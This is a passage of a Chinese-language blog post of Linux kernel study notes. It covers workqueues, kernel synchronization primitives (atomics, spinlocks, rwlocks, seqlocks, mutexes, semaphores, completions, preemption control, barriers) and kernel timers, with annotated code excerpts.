any</span></span><br><span class="line"><span class="comment">	 * event.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	worker_enter_idle(worker);</span><br><span class="line">	__set_current_state(TASK_IDLE);</span><br><span class="line">	spin_unlock_irq(&amp;pool-&gt;lock);</span><br><span class="line">	schedule();</span><br><span class="line">	<span class="keyword">goto</span> woke_up;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>工作队列的实现比较复杂，我这里还没有完全看明白，以后有需要在专门学习一下</li>
</ul>
<p>其实工作队列的核心思想就是：内核启动时创建并维护一个工作队列，该队列由内核线程实现，没有任务执行时就陷入睡眠，在用户调用 schedule_work 时，将 work 挂到该工作队列的链表或者队列中，唤醒该内核线程并执行该 work（用户也可以自己创建一个 workqueue 来使用）</p>
<h2 id="内核同步"><a href="#内核同步" class="headerlink" title="内核同步"></a>内核同步</h2><p>存在共享资源（共享一个文件，一块内存等等）的时候，为了防止并发访问时共享资源的数据不一致，引入了同步机制</p>
<p>所谓同步，其实防止在临界区中形成竞争条件：</p>
<ul>
<li>临界区 - 也称为临界段，就是访问和操作共享数据的代码段</li>
<li>竞争条件 - 2个或2个以上线程在临界区里同时执行的时候，就构成了竞争条件</li>
</ul>
<p>内核同步常见方法如下：</p>
<p><strong>原子操作</strong></p>
<p>原子操作是由编译器来保证的，保证一个线程对数据的操作不会被其他线程打断</p>
<ul>
<li>所谓原子操作是指不会被线程调度机制打断的操作，这种操作一旦开始，就一直运行到结束，中间不会有任何 context switch</li>
<li>原子操作只能针对 <code>atomic_t</code> 类型的数据进行处理：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> counter;</span><br><span class="line">&#125; <span class="keyword">atomic_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> counter;</span><br><span class="line">&#125; <span class="keyword">atomic64_t</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>相关的原子操作如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> atomic_read(v)	READ_ONCE((v)-&gt;counter) <span class="comment">/* 原子读 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> atomic64_read(v)	READ_ONCE((v)-&gt;counter)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> atomic_set(v,i)	WRITE_ONCE(((v)-&gt;counter), (i)) <span class="comment">/* 原子写 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> atomic64_set(v,i)	WRITE_ONCE((v)-&gt;counter, (i))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_bit(nr,p)		ATOMIC_BITOP(set_bit,nr,p) <span class="comment">/* 设置第nr位(置&quot;1&quot;) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_bit(nr,p)		ATOMIC_BITOP(clear_bit,nr,p) <span class="comment">/* 清空第nr位(置&quot;0&quot;) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> change_bit(nr,p)	ATOMIC_BITOP(change_bit,nr,p) <span class="comment">/* 改变第nr位(异或) */</span></span></span><br></pre></td></tr></table></figure>
<p><strong>锁</strong></p>
<p>为了给临界区加锁，保证临界区数据的同步，首先了解一下内核中哪些情况下会产生并发</p>
<p>内核中造成竞争条件的原因：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th><strong>竞争原因</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>中断</td>
<td>中断随时会发生，也就会随时打断当前执行的代码，如果中断和被打断的代码在相同的临界区，就产生了竞争条件</td>
</tr>
<tr>
<td>软中断和tasklet</td>
<td>软中断和 tasklet 也会随时被内核唤醒执行，也会像中断一样打断正在执行的代码</td>
</tr>
<tr>
<td>内核抢占</td>
<td>内核具有抢占性，发生抢占时，如果抢占的线程和被抢占的线程在相同的临界区，就产生了竞争条件</td>
</tr>
<tr>
<td>睡眠及用户空间的同步</td>
<td>用户进程睡眠后，调度程序会唤醒一个新的用户进程，新的用户进程和睡眠的进程可能在同一个临界区中</td>
</tr>
<tr>
<td>对称多处理</td>
<td>2个或多个处理器可以同时执行相同的代码</td>
</tr>
</tbody>
</table>
</div>
<p>加锁后多线程的执行流程：</p>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1663685252415-1666871176498.png" class width="1663685252415"> 
<p>常见的锁有以下几类：</p>
<p>自旋锁：当一个线程获取了锁之后，其他试图获取这个锁的线程一直在循环等待获取这个锁，直至锁重新可用</p>
<ul>
<li>由于线程实在一直循环的获取这个锁，所以会造成CPU处理时间的浪费，因此最好将自旋锁用于能很快处理完的临界区</li>
<li>自旋锁常用于中断处理程序中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">spin_lock_init(lock); <span class="comment">/* 初始化自旋锁lock */</span></span><br><span class="line">spin_trylock(lock); <span class="comment">/* 尝试获取指定的锁(如果获取,则返回&quot;0&quot;,否则返回非&quot;0&quot;) */</span></span><br><span class="line">spin_is_locked(lock); <span class="comment">/* 如果指定的锁当前正在被获取,则返回非&quot;0&quot;,否则返回&quot;0&quot; */</span></span><br><span class="line"></span><br><span class="line">spin_lock(&amp;lock); <span class="comment">/* 获取指定的锁 */</span></span><br><span class="line">spin_lock_irq(&amp;lock); <span class="comment">/* 禁止本地中断,获取指定的锁 */</span></span><br><span class="line">spin_lock_irqsave(&amp;lock, flags); <span class="comment">/* 保存中断的当前状态,禁止本地中断,获取指定的锁 */</span></span><br><span class="line"></span><br><span class="line">spin_unlock(&amp;lock); <span class="comment">/* 对指定的锁进行解锁 */</span></span><br><span class="line">spin_unlock_irq(&amp;lock); <span class="comment">/* 对指定的锁进行解锁,恢复本地中断 */</span></span><br><span class="line">spin_unlock_irqrestore(&amp;lock, flags); <span class="comment">/* 对指定的锁进行解锁,并恢复到加锁之前的状态 */</span></span><br></pre></td></tr></table></figure>
<p>读写锁：读写锁实际是一种特殊的自旋锁</p>
<ul>
<li>它把对共享资源的访问者划分成读者和写者，读者只对共享资源进行读访问，写者则需要对共享资源进行写操作 </li>
<li>其实还是一种锁，是给一段临界区代码加锁，读写之间是互斥的：读的时候写阻塞，写的时候读阻塞，而且读和写在竞争锁的时候，写会优先得到锁</li>
<li>一次只有一个线程可以占有写模式的读写锁，但是可以有多个线程同时占有读模式的读写锁</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">DEFINE_RWLOCK(lock); <span class="comment">/* 初始化读写锁 */</span></span><br><span class="line"></span><br><span class="line">read_lock(&amp;lock); <span class="comment">/* 获取读锁 */</span></span><br><span class="line">read_lock_irq(&amp;lock); <span class="comment">/* 禁止本地中断,获取读锁 */</span></span><br><span class="line">read_lock_irqsave(&amp;lock); <span class="comment">/* 保存中断的当前状态,禁止本地中断,获取读锁 */</span></span><br><span class="line">read_unlock(&amp;lock); <span class="comment">/* 释放读锁 */</span></span><br><span class="line">read_unlock_irq(&amp;lock); <span class="comment">/* 释放读锁,恢复本地中断 */</span></span><br><span class="line">read_unlock_irqrestore(&amp;lock); <span class="comment">/* 释放读锁,并恢复到加锁之前的状态 */</span></span><br><span class="line"></span><br><span class="line">write_lock(&amp;lock); <span class="comment">/* 获取写锁 */</span></span><br><span class="line">write_lock_irq(&amp;lock); <span class="comment">/* 禁止本地中断,获取写锁 */</span></span><br><span class="line">write_lock_irqsave(&amp;lock); <span class="comment">/* 保存中断的当前状态,禁止本地中断,获取写锁 */</span></span><br><span class="line">write_unlock(&amp;lock); <span class="comment">/* 释放写锁 */</span></span><br><span class="line">write_unlock_irq(&amp;lock); <span class="comment">/* 释放写锁,恢复本地中断 */</span></span><br><span class="line">write_unlock_irqrestore(&amp;lock); <span class="comment">/* 释放写锁,并恢复到加锁之前的状态 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>PS：这里的[读锁]和[写锁]指的都是 <code>lock</code>，它们是同一个锁，只是为了区分[读者]和[写者]和分开命名</li>
</ul>
<p>顺序锁：顺序锁其实就对读写锁的一种优化</p>
<ul>
<li>对某一个共享数据读取的时候不加锁，写的时候加锁</li>
<li>在读写锁的基础上，读锁被获取的情况下，写锁仍然可以被获取（顺序锁为写者赋予了较高的优先级，即使在读者正在读的时候，也允许写着继续运行）</li>
<li>可以实现同时读写，但是同时写不被允许</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFINE_SEQLOCK(x) <span class="comment">/* 初始化seq锁(顺序锁) */</span></span></span><br><span class="line"></span><br><span class="line">read_seqlock_excl(&amp;lock); <span class="comment">/* 获取读锁 */</span></span><br><span class="line">read_seqlock_excl_bh(&amp;lock); <span class="comment">/* 获取读锁,禁止当前处理器的软中断 */</span></span><br><span class="line">read_seqlock_excl_irq(&amp;lock); <span class="comment">/* 获取读锁,禁止当前处理器的硬中断 */</span></span><br><span class="line">read_seqlock_excl_irqsave(&amp;lock); <span class="comment">/* 获取读锁,保存中断的当前状态,禁止当前处理器的硬中断 */</span></span><br><span class="line"></span><br><span class="line">read_sequnlock_excl(&amp;lock); <span class="comment">/* 释放读锁 */</span></span><br><span class="line">read_sequnlock_excl_irq(&amp;lock); <span class="comment">/* 内核中只有定义,不使用 */</span></span><br><span class="line"></span><br><span class="line">write_seqlock(&amp;lock); <span class="comment">/* 获取写锁 */</span></span><br><span class="line">write_seqlock_bh(&amp;lock); <span class="comment">/* 获取写锁,禁止当前处理器的软中断 */</span></span><br><span class="line">write_seqlock_irq(&amp;lock); <span class="comment">/* 获取写锁,禁止当前处理器的硬中断 */</span></span><br><span class="line">write_seqlock_irqsave(&amp;lock); <span class="comment">/* 获取写锁,禁止当前处理器的硬中断,保存中断的当前状态 */</span></span><br><span class="line"></span><br><span class="line">write_unseqlock(&amp;lock); <span class="comment">/* 释放写锁 */</span></span><br><span class="line">write_sequnlock_irq(&amp;lock); <span class="comment">/* 释放写锁,恢复被禁止的硬中断 */</span></span><br><span class="line">write_sequnlock_irqrestore(&amp;lock); <span class="comment">/* 释放写锁,恢复被禁止的硬中断,恢复中断的状态 */</span></span><br></pre></td></tr></table></figure>
<p>互斥锁：互斥锁也是一种可以睡眠的锁（互斥锁不属于自旋锁，而是属于信号量）</p>
<ul>
<li>其实相当于二值信号量，只是内核提供了单独的API，使用的场景也更严格一些</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mutex_init(&amp;mutex); <span class="comment">/* 动态初始化该互斥锁 */</span></span><br><span class="line">mutex_lock(&amp;mutex); <span class="comment">/* 互斥锁加锁 */</span></span><br><span class="line">mutex_unlock(&amp;mutex); <span class="comment">/* 互斥锁解锁 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>必须在同一个上下文中加锁或解锁</li>
<li>不能在中断中使用</li>
</ul>
<p><strong>信号量</strong></p>
<p>信号量也是一种锁，和自旋锁不同的是，进程获取不到信号量的时候，不会像自旋锁一样循环的去试图获取锁，而是进入睡眠（进入等待队列），直至有信号量释放出来时，才会唤醒睡眠的进程，进入临界区执行</p>
<p>信号量结构体具体如下： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">semaphore</span> &#123;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span>        lock;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        count; <span class="comment">/* 信号量计数 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">wait_list</span>;</span> <span class="comment">/* 等待队列 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其实信号量就相当于一个 [常数] 加上一个 [等待队列]：</p>
<ul>
<li>[常数] &gt; 0：代表了当前临界区可以容纳的进程个数</li>
<li>[常数] = 0：争用信号量的进程会进入睡眠（进入等待队列）</li>
<li>[常数] &lt; 0：在等待队列中的进程数目</li>
</ul>
<p>当一个进程进入临界区时，会先检查该临界区的 <code>semaphore-&gt;count</code>：</p>
<ul>
<li>如果大于“0”就进入该临界区，同时 <code>semaphore-&gt;count--</code></li>
<li>如果小于等于“0”就进入 <code>semaphore-&gt;wait_list</code>，同时 <code>semaphore-&gt;count--</code></li>
</ul>
<p>当一个进程离开临界区时，也会检查该临界区的 <code>semaphore-&gt;count</code>：</p>
<ul>
<li>如果小于“0”就把 <code>semaphore-&gt;wait_list</code> 中的一个进程放入临界区，同时 <code>semaphore-&gt;count++</code></li>
<li>如果大于等于“0”，只执行 <code>semaphore-&gt;count++</code> 就可以了</li>
</ul>
<p>常规信号量：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sema_init</span><span class="params">(struct semaphore *sem, <span class="keyword">int</span> val)</span></span>; <span class="comment">/* 初始化信号量,将信号量的计数器值设置为&#x27;val&#x27; */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">down</span><span class="params">(struct semaphore *sem)</span></span>; <span class="comment">/* 获取信号量,成功后信号量计数器将减&#x27;1&#x27; */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">down_interruptible</span><span class="params">(struct semaphore *sem)</span></span>; <span class="comment">/* 用来获取信号量,将信号量sem的计数器值减&#x27;1&#x27;,但它是可被信号中断的 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">down_trylock</span><span class="params">(struct semaphore *sem)</span></span>; <span class="comment">/* 尝试获取信号量sem(若该sem已经被占用,则返回非&#x27;0&#x27;,否则返回&#x27;0&#x27;,并且获取该sem) */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">up</span><span class="params">(struct semaphore *sem)</span></span>; <span class="comment">/* 释放信号量,成功后信号量计数器将减&#x27;1&#x27; */</span></span><br></pre></td></tr></table></figure>
<p>读写信号量：和读写锁一样，只是底层用的是信号量而已</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> init_rwsem(sem) <span class="comment">/* 初始化读写信号量,将信号量的count字段设置为&#x27;0&#x27;, wait_lock自旋锁设置为未锁,将等待进程的链表wait_list置为空链表 */</span>	</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __sched <span class="title">down_read</span><span class="params">(struct rw_semaphore *sem)</span></span>; <span class="comment">/* 读者获取信号量sem,如果该信号量在被写者所持有,则对该函数的调用会导致调用者的睡眠 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> __sched <span class="title">down_write</span><span class="params">(struct rw_semaphore *sem)</span></span>; <span class="comment">/* 写者获取信号量sem,如果该信号量被读者或写者所持有,则对该函数的调用会导致调用者的睡眠 */</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">up_read</span><span class="params">(struct rw_semaphore *sem)</span></span>; <span class="comment">/* 读者释放读写信号量 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">up_write</span><span class="params">(struct rw_semaphore *sem)</span></span>; <span class="comment">/* 写者释放读写信号量 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>[读者]拿到[读锁]时，其他的[读者]想要拿锁是不会阻塞的，而[写者]则会阻塞</li>
<li>[写者]拿到[写锁]时，不管是[读者]还是[写者]都会阻塞（比读写锁更严格）</li>
</ul>
<p><strong>完成变量</strong></p>
<p>完成变量的机制类似于信号量，比如一个线程A进入临界区之后，另一个线程B会在完成变量上等待，线程A完成了任务出了临界区之后，使用完成变量来唤醒线程B</p>
<ul>
<li>如果在内核中一个任务需要发出信号通知另一任务发生了某个特定事件，利用完成变量（completion variable）是使两个任务得以同步的简单方法</li>
<li>如果一个任务要执行一些工作时，另一个任务就会在完成变量上等待</li>
</ul>
<p>案例：<code>vfork</code> 函数会使用完成变量去唤醒父进程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_completion</span><span class="params">(struct completion *c)</span></span>; <span class="comment">/* 创建并初始化完成变量 */</span> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">wait_for_completion</span><span class="params">(struct completion *c)</span></span>; <span class="comment">/* 命令当前任务等待特定的事件 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">complete</span><span class="params">(struct completion *c)</span></span>; <span class="comment">/* 唤醒等待的内核任务 */</span></span><br></pre></td></tr></table></figure>
<p><strong>禁止抢占</strong></p>
<p>内核是抢占性的，内核中的进程在任何时候都可以停止，使另一个优先度更高的进程运行，如果一个进程和被它抢占的进程在同一个临界区运行，那么就可能会出现安全问题</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">进程A对未添加保护的变量buf进行访问</span><br><span class="line">进程A被进程B抢占</span><br><span class="line">进程B也操作变量buf</span><br><span class="line">进程B结束</span><br><span class="line">进程A重新调度</span><br><span class="line">进程A出现安全问题</span><br></pre></td></tr></table></figure>
<p>内核抢占代码使用自旋锁作为非抢占区域的标记（如果一个自旋锁被持有，内核便不能进行抢占），对于独立变量而言，没有必要设置自旋锁（会浪费系统资源），因此需要使用 <code>preempt_disable</code> 来禁止内核抢占</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preempt_enable() <span class="comment">/* 允许内核抢占,并使preempt_count减&#x27;1&#x27;  */</span></span><br><span class="line">preempt_disable() <span class="comment">/* 禁止内核抢占,并使preempt_count加&#x27;1&#x27; */</span></span><br></pre></td></tr></table></figure>
<p><strong>顺序与屏障</strong></p>
<p>CPU 可能需要按照写数据的顺序来读数据（类似于 FIFO），但编译器和处理器为了提高效率，常常会对读写的顺序进行“重新排布”</p>
<p>有一些机械指令可以示意 CPU 不要对周围的数据进行重新排序，这些指令就叫做“屏障”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rmb() <span class="comment">/* 读屏障:阻止屏障两边的&quot;载入指令&quot;发生重排序 */</span></span><br><span class="line">wmb() <span class="comment">/* 写屏障:阻止屏障两边的&quot;存储指令&quot;发生重排序 */</span></span><br><span class="line">mb() <span class="comment">/* 阻止屏障两边的&quot;载入指令/存储指令&quot;发生重排序 */</span></span><br><span class="line">smp_rmb() <span class="comment">/* 在SMP(多核处理器)上提供rmb功能,在UP(单核处理器)提供barrier功能 */</span></span><br><span class="line">smp_wmb() <span class="comment">/* 在SMP(多核处理器)上提供wmb功能,在UP(单核处理器)提供barrier功能 */</span></span><br><span class="line">smp_mb() <span class="comment">/* 在SMP(多核处理器)上提供mb功能,在UP(单核处理器)提供barrier功能 */</span></span><br><span class="line">barrier() <span class="comment">/* 阻止编译器跨屏障对&quot;载入指令/存储指令&quot;进行优化 */</span></span><br></pre></td></tr></table></figure>
<p><strong>同步方法选择</strong></p>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660900515527-1666871176498.png" class width="1660900515527"> 
<h2 id="系统时间"><a href="#系统时间" class="headerlink" title="系统时间"></a>系统时间</h2><p>系统时间管理在内核中有相当重要的地位，内核中有大量函数都是基于时间驱动的</p>
<p>系统中管理的时间有2种：实际时间和定时器</p>
<ul>
<li>实际时间：现实中钟表上显示的时间，其实内核中并不常用这个时间，主要是用户空间的程序有时需要获取当前时间，所以内核中也管理着这个时间</li>
<li>定时器：内核中主要使用的时间管理方法，通过定时器，可以有效的调度程序的执行 </li>
</ul>
<p><strong>定时器</strong></p>
<p>定时器在内核中用一个链表来保存的，链表的每个节点都是一个定时器 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timer_list</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span>	<span class="title">entry</span>;</span> <span class="comment">/* 定时器链表的入口 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		expires; <span class="comment">/* 以jiffies为单位的&quot;超时时间&quot; */</span></span><br><span class="line">	<span class="keyword">void</span>			(*function)(struct timer_list *); <span class="comment">/* 定时器处理函数 */</span></span><br><span class="line">	u32			flags; <span class="comment">/* 传给处理函数的长整形参数 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_LOCKDEP</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lockdep_map</span>	<span class="title">lockdep_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> *<span class="title">next</span>, **<span class="title">pprev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>定时器的使用中，下面2个概念非常重要：</p>
<ul>
<li>HZ：节拍率(HZ)是时钟中断的频率，表示的一秒内时钟中断的次数 </li>
<li>jiffies：jiffies 用来记录自系统启动以来产生的总节拍数，比如系统启动了 N 秒，那么 jiffies 就为 N×HZ </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> jiffies	raid6_jiffies()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">uint32_t</span> <span class="title">raid6_jiffies</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line">	gettimeofday(&amp;tv, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">return</span> tv.tv_sec*<span class="number">1000</span> + tv.tv_usec/<span class="number">1000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个动态定时器的生命周期中，一般会经过下面的几个步骤： </p>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1661421650964-1666871176498.png" class width="1661421650964"> 
<p>相关的 API 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> timer_setup(timer, callback, flags)			\</span></span><br><span class="line"><span class="meta">	__init_timer((timer), (callback), (flags)) <span class="comment">/* 初始化定时器结构的内部值 */</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_timer</span><span class="params">(struct timer_list *timer)</span></span>; <span class="comment">/* 激活目标定时器 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mod_timer</span><span class="params">(struct timer_list *timer, <span class="keyword">unsigned</span> <span class="keyword">long</span> expires)</span></span>; <span class="comment">/* 更改超时时间 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">del_timer</span><span class="params">(struct timer_list * timer)</span></span>; <span class="comment">/* 停止目标定时器 */</span></span><br></pre></td></tr></table></figure>
<p><strong>时间中断</strong></p>
<p>时钟中断处理程序作为系统定时器而注册到内核中，体系结构的不同，可能时钟中断处理程序中处理的内容不同，介绍如下：</p>
<ul>
<li>时钟中断是一种硬中断，由时间硬件（系统定时器，一种可编程硬件）产生，CPU处理后交由时间中断处理程序来完成更新系统时间、执行周期性任务等</li>
<li>系结构相关部分被注册到内核中，确保中断产生时能执行，这部分不能有耗时操作，主要是更新时间与调用结构无关部分列程（异步）</li>
<li>已到期的定时器由体系结构无关部分来处理，其它的一些耗时操作，如显示时间的更新也在这一部分</li>
</ul>
<p>但是以下这些基本的工作都会执行：</p>
<ul>
<li>获得 xtime_lock 锁（一种顺序锁），以便对访问 jiffies_64 和墙上时间 xtime 进行保护</li>
<li>需要时应答或重新设置系统时钟</li>
<li>周期性的使用墙上时间更新实时时钟</li>
<li>调用 <code>tick_periodic()</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">tick_periodic</span><span class="params">(<span class="keyword">int</span> cpu)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (tick_do_timer_cpu == cpu) &#123;</span><br><span class="line">		write_seqlock(&amp;jiffies_lock);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* 记录下一个节拍事件 */</span></span><br><span class="line">		tick_next_period = ktime_add(tick_next_period, tick_period);</span><br><span class="line"></span><br><span class="line">		do_timer(<span class="number">1</span>);</span><br><span class="line">		write_sequnlock(&amp;jiffies_lock);</span><br><span class="line">		update_wall_time();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	update_process_times(user_mode(get_irq_regs())); <span class="comment">/* 更新所耗费的各种节拍数 */</span></span><br><span class="line">	profile_tick(CPU_PROFILING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_timer</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> ticks)</span></span></span><br><span 